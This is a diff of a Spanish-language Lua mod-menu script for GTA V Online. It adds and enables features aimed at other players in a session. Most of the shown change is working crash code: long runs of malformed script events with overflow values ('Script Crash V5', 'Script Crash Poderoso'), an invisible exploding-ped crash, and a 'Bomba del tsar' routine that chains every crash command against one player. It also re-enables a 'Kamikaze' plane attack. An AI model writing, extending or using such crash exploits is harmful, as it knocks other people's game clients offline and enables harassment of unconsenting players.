@@ -10,7 +10,7 @@ util.require_natives(1663599433)
 util.toast("Bienvenide Al Script!!")
 util.toast("Cargando, espere... (1-2s)")
 local response = false
-local localVer = 3.661
+local localVer = 3.7
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -47,6 +47,10 @@ until response
 --end
 
 --spmode = require "ryzescript.sportmode"
+
+if not SCRIPT_MANUAL_START then
+    util.stop_script()
+end
 
 sleep(1200)
 
@@ -843,18 +847,18 @@ players.on_join(function(player_id)
     --end)
 
 
-    --local options <const> = {"Lazer", "Mammatus",  "Cuban800"}
-	--menu.action_slider(malicious, ("Kamikaze"), {}, "", options, function (index, plane)
-	--	local hash <const> = util.joaat(plane)
-	--	request_model(hash)
-	--	local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
-	--	local pos = players.get_position(targetPed, 20.0, 20.0)
-	--	pos.z = pos.z + 30.0
-	--	local plane = entities.create_vehicle(hash, pos, 0.0)
-	--	players.get_position(plane, targetPed, true)
-	--	VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
-	--	VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
-	--end)
+    local options <const> = {"Lazer", "Mammatus",  "Cuban800"}
+	menu.action_slider(malicious, ("Kamikaze"), {}, "", options, function (index, plane)
+		local hash <const> = util.joaat(plane)
+		request_model(hash)
+		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+		local pos = players.get_position(targetPed, 20.0, 20.0)
+		pos.z = pos.z + 30.0
+		local plane = entities.create_vehicle(hash, pos, 0.0)
+		players.get_position(plane, targetPed, true)
+		VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
+		VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
+	end)
 
 
     local msg = ("Ya lo siguen los mercenarios")
@@ -1264,7 +1268,37 @@ players.on_join(function(player_id)
 
     end)
 
-    menu.action(twotake, "Script Crash V1", {"crashv6"}, "", function()
+    menu.action(twotake, "Modelo Invalido V3", {"crashv10"}, "", function()
+        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+        local hash = util.joaat("cs_taostranslator2")
+        while not STREAMING.HAS_MODEL_LOADED(hash) do
+            STREAMING.REQUEST_MODEL(hash)
+            util.yield(5)
+        end
+        --coord.z -= 1
+        local ped = {}
+        for i = 0, 10 do
+            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
+            ped[i] = entities.create_ped(0, hash, coord, 0)
+            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
+            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
+            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
+            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
+            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
+            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
+        util.yield(25)
+        end
+        util.yield(2500)
+        for i = 0, 10 do
+            entities.delete_by_handle(ped[i])
+            util.yield(10)
+        end
+
+    end)
+
+    local scrcrash = menu.list(twotake, "Script Crashes", {}, "")
+
+    menu.action(scrcrash, "Script Crash V1", {"crashv6"}, "", function()
         local int_min = -2147483647
         local int_max = 2147483647
             for i = 1, 15 do
@@ -1296,7 +1330,7 @@ players.on_join(function(player_id)
     
     end)
 
-    menu.action(twotake, "Script Crash V2", {"crashv7"}, "", function()
+    menu.action(scrcrash, "Script Crash V2", {"crashv7"}, "", function()
         local int_min = -2147483647
         local int_max = 2147483647
             for i = 1, 15 do
@@ -1318,7 +1352,7 @@ players.on_join(function(player_id)
 
     end)
 
-    menu.action(twotake, "Script Crash V3", {"crashv8"}, "No funciona muy bien", function()
+    menu.action(scrcrash, "Script Crash V3", {"crashv8"}, "No funciona muy bien", function()
         local int_min = -2147483647
         local int_max = 2147483647
             for i = 1, 15 do
@@ -1335,6 +1369,174 @@ players.on_join(function(player_id)
             util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
             util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
             util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+    end)
+
+    menu.action(scrcrash, "Script Crash V5", {"crashv11"}, "No funciona muy bien", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+        for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+            end
+            util.yield()
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+            end
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+    end)
+
+    menu.action(scrcrash, "Script Crash Poderoso", {"crashv9"}, "Funciona, pero... esta muy potente .w. (Posible overload)", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
+            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
+            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
+            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
+            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
+            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
+            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
+            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
+            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
+            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
+            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
+            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
+            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
+            end
+            util.yield(200)
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+                util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
+                util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
+                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
+                util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
+                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+                util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
+                util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
+                util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
+                util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
+                util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
+                util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+                util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+                util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+                util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+                util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+                util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+                util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+                util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+                util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+                util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+                util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
+                util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
+                util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
+                util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
+                util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
+                util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
+                util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
+                util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
+                util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
+                util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
+                util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
+                util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
+                util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
+                util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
+                util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
+                util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
+                util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
+                util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
+                util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
+                util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
+                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
+                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
+            end
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
+            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
+            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
+            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
+            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
+            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
+            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
+            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
+            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
+            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
+            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
+            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
+            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
+            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
+            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
+            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
+            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
+            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
     end)
 
     -- This is a Prisuhm crash fixed by me <3
@@ -1543,6 +1745,62 @@ players.on_join(function(player_id)
         menu.trigger_commands("anticrashcamera off")
     end)
 
+    menu.action(crashes, "Bomba del tsar V3", {"tsarbomba3"}, "Crash demandante de pc, si no tienes buena pc no te recomiendo usarlo (Inbloqueable uwu) \n(Necesita Regular Para Funcionar Bien/ Posible Overload)", function()
+        local objective = player_id
+        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
+        menu.trigger_commands("anticrashcamera on")
+        menu.trigger_commands("potatomode on")
+        menu.trigger_commands("trafficpotato on")
+        util.toast("Iniciando...")
+        util.toast("Pobre man")
+        menu.trigger_commands("rlag3"..players.get_name(player_id))
+        util.yield(2500)
+        menu.trigger_commands("crashv1"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv2"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv3"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv5"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv6"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv7"..players.get_name(player_id))
+        util.yield(700)
+        menu.trigger_commands("crashv8"..players.get_name(player_id))
+        util.yield(700)
+        menu.trigger_commands("crashv9"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv10"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv11"..players.get_name(player_id))
+        -- Turned off because of a self-crash error
+        --util.yield(600)
+        --menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(2500)
+        menu.trigger_commands("crash"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("ngcrash"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("footlettuce"..players.get_name(player_id))
